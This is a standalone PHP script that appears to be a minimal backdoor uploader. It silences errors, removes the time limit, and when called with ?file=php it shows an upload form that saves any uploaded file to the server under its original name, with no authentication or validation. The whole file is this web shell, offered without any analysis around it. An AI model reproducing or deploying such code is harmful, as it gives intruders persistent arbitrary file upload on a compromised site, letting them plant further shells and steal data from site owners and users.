<?php 
error_reporting(0); set_time_limit(0); 
$file = $_GET['file'];if($file == 'php'){ 
$filename = $_FILES['file']['name'];$filetmp = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'><input pada type='file'name='file' />
<input type='submit' value='do it!' /></form>"; move_uploaded_file($filetmp,$filename);}?>